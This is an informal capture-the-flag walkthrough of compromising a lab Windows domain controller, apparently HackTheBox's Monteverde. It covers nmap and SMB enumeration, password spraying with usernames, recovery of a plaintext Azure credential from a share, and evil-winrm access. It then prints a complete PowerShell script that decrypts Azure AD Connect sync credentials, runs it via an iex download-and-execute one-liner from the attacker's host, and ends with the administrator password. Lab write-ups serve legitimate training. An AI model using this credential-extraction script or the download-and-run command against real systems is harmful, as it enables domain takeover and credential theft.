```bash
nmap -sV -sC 10.129.228.111
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-03 09:39 CDT
Nmap scan report for 10.129.228.111
Host is up (0.0079s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-03 14:40:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-03T14:40:02
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.07 seconds

```

enum4linux gave us some good info as it always does 

```bash
   Users via RPC on 10.129.228.111    |
 =======================================
[*] Enumerating users via 'querydispinfo'
[+] Found 10 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 10 user(s) via 'enumdomusers'
[+] After merging user results we have 10 user(s) total:
'1104':

```

```bash
omain Information via SMB session for 10.129.228.111    |
 =============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: MONTEVERDE
NetBIOS domain name: MEGABANK
DNS domain: MEGABANK.LOCAL
FQDN: MONTEVERDE.MEGABANK.LOCAL
Derived membership: domain member
Derived domain: MEGABANK

```

```bash
10.129.228.111 MEGABANK.LOCAL MONTEVERDE.MEGABANK.LOCAL

```

```bash
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
Guest
```

AS-REP gets us nowhere 

```bash
impacket-GetNPUsers MEGABANK.LOCAL/ -dc-ip 10.129.228.111 -usersfile users.txt -no-pass
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] User mhope doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SABatchJobs doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-ata doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-bexec doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-netapp doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dgalanos doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User roleary doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User smorgan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

So i used a guide, you can and should (apparently if you run out of options use, the usernames against themselves just too see… whatever.

```bash
nxc smb 10.129.228.111 -u users.txt -p users.txt --continue-on-success --verbose
```

```bash
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
           INFO     Error creating SMBv1 connection to 10.129.228.111: Error occurs while reading from remote(104)  
```

SMB with these creds shows us some juice

```bash
smbmap -H 10.129.228.111 -u SABatchJobs -p 'SABatchJobs'
[+] IP: 10.129.228.111:445	Name: MEGABANK.LOCAL                                    
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	azure_uploads                                     	READ ONLY	
	C$                                                	NO ACCESS	Default share
	E$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	users$                                            	READ ONLY	

```

now in here we went through and saw nothing in azure_uploads however it did show us its azure related .

```bash
mbclient //10.129.228.111/users$ -U SABatchJobs 
Password for [WORKGROUP\SABatchJobs]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 07:12:48 2020
  ..                                  D        0  Fri Jan  3 07:12:48 2020
  dgalanos                            D        0  Fri Jan  3 07:12:30 2020
  mhope                               D        0  Fri Jan  3 07:41:18 2020
  roleary                             D        0  Fri Jan  3 07:10:30 2020
  smorgan                             D        0  Fri Jan  3 07:10:24 2020

```

mhope is the only one with items in her dir 

```bash
at azure.xml
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>

```

so i sprayed it against the userlist again 

```bash
nxc smb 10.129.228.111 -u users.txt -p 4n0therD4y@n0th3r$ --continue-on-success --verbose
```

was just hope so lets evilwin in 

```bash
evil-winrm -i 10.129.228.111 -u mhope -p 4n0therD4y@n0th3r$
```

two bits of post exploit i always like to do now are the following 

```bash
C:\Users\mhope\desktop> net user mhope
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 4:40:05 PM
Password expires             Never
Password changeable          1/3/2020 4:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   4/3/2025 8:08:51 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.

```

```bash
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

which in this case may be valuable, first time seeing so lets figure this out 

enumerating the file system we found a few interesting things notably “TokenCache.dat”

inside it seemed to have Tokens of some kind but i cant make out what use it is 

```bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSIsImtpZCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLndpbmRvd3MubmV0LyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OC8iLCJpYXQiOjE1NzgwNTgyNzYsIm5iZiI6MTU3ODA1ODI3NiwiZXhwIjoxNTc4MDYyMTc2LCJhY3IiOiIxIiwiYWlvIjoiNDJWZ1lBZ3NZc3BPYkdtYjU4V3ZsK0d3dzhiYXA4bnhoOWlSOEpVQit4OWQ5L0g2MEFBQSIsImFtciI6WyJwd2QiXSwiYXBwaWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJhcHBpZGFjciI6IjAiLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInB1aWQiOiIxMDAzMjAwMDkzOTYzMDJCIiwic2NwIjoiNjJlOTAzOTQtNjlmNS00MjM3LTkxOTAtMDEyMTc3MTQ1ZTEwIiwic3ViIjoiVWFTMGI5ZHJsMmlmYzlvSXZjcUFlbzRoY3c1YWpyV3g3bU5DMklrMkRsayIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJFVSIsInRpZCI6IjM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OCIsInVuaXF1ZV9uYW1lIjoiam9obkBhNjc2MzIzNTQ3NjNvdXRsb29rLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJsM2xBR3NBRVYwcVdQelJ1Vkh4U0FBIiwidmVyIjoiMS4wIn0.czHUwYjleGp2C1c_BMZIZkEHz-12R86qmngaiyTeTW_bM659hqetbQylvf_qCJDuxD8e28H6Oqw5Hn1Hwij7yHK-kOjUeUlXkGyzFhQbDf3CQLvFsZioUiHHiighrVjZfu6Rolv8fxoG3Q8cXS-Ms_Wm6RI-zcaK9Eyu841D51jzvYI60rC9HTummktfVURP2xf3DnskqjJF1dDlSi62gPGXGk0xZordZFiGoYAtv8qiMAiSCioN_sw_xWRJ250nvw90biQ1NkPRpSGf8jNpbYktB0Ti8-sNblaGRJBQqmHxZ-0PkSq31op2CzHN7wwYCJOEoJpOtS-x4j1DGZ19hA
```

turned out to be a dud tried curling with it and it threw up a 401

. The idea is that there is a user that is setup to handle replication of Active Directory to Azure. In the default case, that’s an account named like MSOL_[somehex]. I’ll see shortly that’s not the case here.

It turns out mhope is able to connect to the local database and pull the configuration. I can then decrypt it and get the username and password for the account that handles replication

useful link : https://blog.xpnsec.com/azuread-connect-for-redteam/ 

```bash
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

Running this script 

```bash
iex(new-object net.webclient).downloadstring('http://10.10.14.11/Get-MSOLCredentials.ps1')
```

```bash
evil-winrm -i 10.129.25.207 -u administrator -p 'd0m@in4dminyeah!'
```
